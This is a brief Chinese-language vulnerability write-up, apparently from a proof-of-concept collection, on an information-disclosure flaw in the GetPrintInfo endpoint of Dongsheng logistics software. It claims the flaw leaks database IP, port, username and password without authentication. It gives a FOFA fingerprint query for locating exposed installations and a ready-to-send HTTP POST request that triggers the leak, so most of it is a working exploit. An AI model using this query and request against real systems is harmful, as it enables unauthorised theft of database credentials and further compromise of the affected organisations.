## 东胜物流软件/CommMng/Print/GetPrintInfo-信息泄露漏洞

## 一、漏洞简介
东胜物流软件是一款用于物流管理的系统，旨在提供高效的物流操作和数据管理功能。在该软件的 /CommMng/Print/GetPrintInfo 接口中存在一个信息泄露漏洞。攻击者可以利用此漏洞，未经授权地获取系统的数据库配置信息，包括但不限于数据库的IP地址、端口、账户名以及密码等敏感数据。这可能导致数据库遭到进一步的恶意访问，从而造成数据泄露、篡改或对系统造成更深层次的破坏。

## fofa
```
(body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"
```

## POC
```
POST /CommMng/Print/GetPrintInfo HTTP/1.1
Host: 1
Content-Type: application/x-www-form-urlencoded

type=test&sql1=&sql2=&sql3=&sql4=&sql5=&sql6=
```
